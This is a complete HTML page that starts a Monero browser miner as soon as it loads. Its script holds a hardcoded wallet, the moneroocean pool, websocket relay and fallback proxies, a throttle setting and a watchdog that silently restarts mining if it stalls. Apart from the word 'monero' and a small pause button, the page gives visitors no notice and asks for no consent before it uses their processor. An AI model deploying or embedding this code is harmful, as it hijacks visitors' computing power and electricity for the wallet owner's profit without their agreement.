<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>.</title>
<style>
  :root { color-scheme: dark }
  html, body { height: 100% }
  body {
    margin: 0; background: #0a0a0c; color: #cfcfd6;
    font: 13px/1.6 ui-monospace, SFMono-Regular, Menlo, monospace;
    display: grid; place-items: center;
  }
  .w { text-align: center; opacity: .85 }
  .w b { font-weight: 500; letter-spacing: .04em }
  .a { font-size: 10px; color: #5d5d69; margin-top: 8px; word-break: break-all; max-width: 32ch }
  #p {
    position: fixed; right: 12px; bottom: 12px; display: flex; gap: 7px;
    align-items: center; padding: 6px 10px; border-radius: 999px;
    background: #15151a; border: 1px solid #24242c; font-size: 11px;
    cursor: pointer; user-select: none;
  }
  #d { width: 6px; height: 6px; border-radius: 50%; background: #3b3b45 }
  #d.ok { background: #2fd07a; box-shadow: 0 0 7px #2fd07a }
  #d.bad { background: #cf5237 }
  #d.wait { background: #cf9a37 }
</style>
</head>
<body>

<div class="w">
  <b>monero</b>
  <div class="a" id="a"></div>
</div>

<div id="p" title="pause / resume"><span id="d"></span><span id="t">…</span></div>

<script src="/miner.js"></script>
<script>
(() => {
  'use strict';

  const WALLET = '446vGEauAzVHFxd9yMcxCA4SMUzuAB9ggXxZu19TFF1wYGZ4UBSYrdHBt1GbEChH1QYiopYCsReLr1dveAffyTZv4GbTtRx';
  const POOL   = 'moneroocean.stream';
  const RIG    = 'web';

  const q = new URLSearchParams(location.search);
  const THROTTLE = Math.max(0, Math.min(Number(q.get('throttle') ?? 15), 100));

  document.getElementById('a').textContent =
    WALLET.slice(0, 8) + '…' + WALLET.slice(-6);

  const dot = document.getElementById('d');
  const txt = document.getElementById('t');
  const pill = document.getElementById('p');

  let paused = false;
  let restarts = 0;
  let lastHashes = 0;
  let lastMove = Date.now();
  let hps = 0;

  function up() {
    if (paused) return;
    if (!window.startMining) return;
    // our relay first, then the pool's own bridge as fallback
    server = location.origin.replace(/^http/, 'ws') + '/bridge'
           + ';wss://webminer.moneroocean.stream/'
           + ';wss://ny1.xmrminingproxy.com/';
    throttleMiner = THROTTLE;
    startMining(POOL, WALLET, RIG, -1, '');
  }

  function down() {
    try { if (window.stopMining) stopMining(); } catch {}
  }

  // hashrate readout straight off the miner's own counter
  setInterval(() => {
    const total = Number(window.totalhashes || 0);
    hps = Math.max(0, (total - lastHashes) / 2);
    lastHashes = total;

    if (total > 0 && hps > 0) lastMove = Date.now();

    if (paused) {
      dot.className = 'bad'; txt.textContent = 'paused'; return;
    }
    if (hps > 0) {
      dot.className = 'ok';
      txt.textContent = hps > 9999
        ? (hps / 1000).toFixed(1) + ' kH/s'
        : Math.round(hps) + ' H/s';
    } else {
      dot.className = 'wait';
      txt.textContent = 'connecting';
    }
  }, 2000);

  // watchdog: silent recovery if the socket dies or the pool drops us
  setInterval(() => {
    if (paused) return;
    if (Date.now() - lastMove < 150000) return;
    if (restarts >= 4) return;
    restarts++;
    lastMove = Date.now();
    down();
    setTimeout(up, 1500);
  }, 30000);

  pill.addEventListener('click', () => {
    if (paused) { paused = false; restarts = 0; lastMove = Date.now(); up(); }
    else { paused = true; down(); }
  });

  // only one tab per browser should mine; the miner's own BroadcastChannel
  // handles election, so just start on load
  if (document.readyState === 'complete') up();
  else window.addEventListener('load', up);
})();
</script>
</body>
</html>
